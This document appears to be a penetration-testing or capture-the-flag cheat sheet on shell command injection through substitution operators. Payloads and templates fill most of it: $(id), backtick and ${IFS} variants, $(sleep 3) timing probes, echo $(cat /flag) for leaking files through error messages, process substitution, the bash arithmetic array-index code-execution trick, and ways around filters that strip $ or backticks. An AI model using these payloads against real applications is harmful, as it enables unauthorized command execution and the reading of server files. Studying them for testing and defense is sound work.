# Inline Execution — substitution inside the argument position

## The two substitution operators

| Form | Shell | Notes |
|---|---|---|
| `$(cmd)` | sh, bash, zsh | nestable, modern preferred |
| `` `cmd` `` | all POSIX + PS* | old form; `` ` `` is PowerShell escape — context matters |
| `((expr))` / `$((expr))` | arithmetic expansion | `$((7*7))` → `49` — eval probe |

\* In PowerShell `` ` `` is the escape char — `` `id `` is NOT execution.

## Why substitution is special — works inside double quotes

```
template: ping "$INPUT"
inject:   127.0.0.1$(id)
result:   ping "127.0.0.1uid=33(www)..."
```

`$()`, `` ` ``, `$(( ))`, `${var}` all expand inside `"..."`. Only `'...'`
blocks everything. So when you can't close the quote, substitution is
the vector.

## Substitution probes — minimal and safe

```
$(echo MARKER)
`echo MARKER`
$(id)
$(sleep 3)         — timing channel inside substitution
${IFS}id           — $IFS expansion
$((7*7))           — arithmetic: response shows 49 → expansion runs
```

The `$((7*7))` probe is the cleanest arithmetic oracle: response
containing `49` where `7*7` was = expansion runs. No side effects, no
separator needed.

## Nested substitution — inside a `$()` already

Template `echo "$( $INPUT )"` — inject `$(id)` → `$( $(id) )` — nested
`$()` works; the inner runs first. Backticks can't nest without escaping
— prefer `$()`.

## Substitution output goes WHERE the command's args are

`$(id)` in an arg position → the command gets `uid=...` as an arg —
usually breaks the command, but the *error or echoed command line* may
leak it. `ping: unknown host uid=33(www)...` is a confirmation.

Better: substitute a READ of the flag into a place that echoes —
`echo $(cat /flag)` inside `ping` args → error message carries the flag.

## Subshells — `(cmd)` and `{ cmd; }`

```
$(...)  — substitution, output substituted
{ id; } — brace group, runs in same shell, output stays in pipeline
( id )  — subshell, same output path
```

`{ id; }` needs spaces + `;` before `}` — `x;{ id;}` pattern.

## Process substitution — `<(cmd)` / `>(cmd)` (bash/zsh)

`<(cat /flag)` expands to `/dev/fd/63` — a fd path to the command's
output. `cat <(cat /flag)` = `cat /flag`. `diff <(cat a) <(cat b)`.

Rare in web injection but real when `bash -c` is the wrapper.

## Arithmetic injection — `$((...))` as an evaluator

`$(( expr ))` evaluates math — and in bash, array indexing inside
arithmetic allows code exec: `x[$(( $(id) ))]`... the classic
`a[$(id)]` trick:

```bash
x=$(( y[$(id >&2)] ))   # id runs inside arithmetic context
```

More useful: `$(())` as a *detection probe* — `$((7*7))` → `49`.

## The "$(id) vs ;id" decision table

| Context | Use |
|---|---|
| arg inside `"..."` | `$(id)` — no quote break needed |
| arg inside `'...'` | must close quote first — `';id` |
| bare arg | `;id` simplest |
| inside `$( )` already | `$(...)` nests |
| inside backticks | close and reopen or just inject the command |

## Escaping `$` — when the app strips it

If `$` is stripped: `` `id` `` backticks (no `$`). If both blocked:
`\x60id\x60` percent-encoded backticks. If backticks blocked: newline
separators or `|`. If all metachars blocked: `argument-injection.md` —
the argv boundary may allow flag injection without any metachar.

## Output redirection in substitution

`$(id > /tmp/o)` — runs id, redirects — output never in arg position.
`$(id)` inline vs `$(id)>&2` — redirect to stderr, which may show in
error responses. `$(id 2>&1)` merges stderr into the substituted output.

## Output to record

- which substitution form expands + where the substituted output lands
